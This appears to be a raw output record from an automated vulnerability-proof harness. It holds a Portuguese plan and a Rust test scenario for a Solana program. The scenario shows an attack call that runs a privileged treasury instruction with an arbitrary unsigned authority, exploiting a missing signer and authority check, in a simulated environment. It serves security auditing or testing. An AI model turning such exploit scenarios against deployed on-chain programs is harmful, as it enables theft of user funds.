attempts.raw:
{
  "plan": "O cenario monta uma conta treasury com dados validos (autoridade armazenada, saldo e flag ativa) e uma conta authority qualquer. O baseline chama process com a authority correta assinando, provando que o cenario esta correto. O ataque chama process com uma authority diferente e sem assinatura, explorando a ausencia de verificacao de is_signer e de comparacao com stored_authority. O efeito mede que a instrucao retornou sucesso mesmo sem a assinatura da autoridade legitima, o que o uso legitimo nao faria se a verificacao existisse.",
  "scenario": "let treasury_key = Pubkey::new_unique();
let authority_key = Pubkey::new_unique();
let attacker_key = Pubkey::new_unique();

let stored_authority = authority_key;
let mut treasury_data = vec![0u8; 49];
treasury_data[8..40].copy_from_slice(stored_authority.as_ref());
treasury_data[40..48].copy_from_slice(&1000u64.to_le_bytes());
treasury_data[48] = 1;

let treasury_account = account(&env.program_id, &treasury_data, None);
let authority_account = account(&env.program_id, &[], None);
let attacker_account = account(&env.program_id, &[], None);

let metas = vec![
    AccountMeta::new(treasury_key, false),
    AccountMeta::new_readonly(authority_key, true),
];
let ix = env.raw_ix(&[0u8], metas);
let contas = vec![
    (treasury_key, treasury_account.clone()),
    (authority_key, authority_account.clone()),
];
let baseline = env.baseline("process legitimo com autoridade assinando", &ix, &contas);

let attack_metas = vec![
    AccountMeta::new(treasury_key, false),
    AccountMeta::new_readonly(attacker_key, false),
];
let attack_ix = env.raw_ix(&[0u8], attack_metas);
let attack_contas = vec![
    (treasury_key, treasury_account),
    (attacker_key, attacker_account),
];
let r = env.attack("process com authority arbitraria sem assinatura", &attack_ix, &attack_contas);
if r.program_result == ProgramResult::Success {
    env.effect("operacao privilegiada executada sem assinatura da autoridade", true);
}"
}

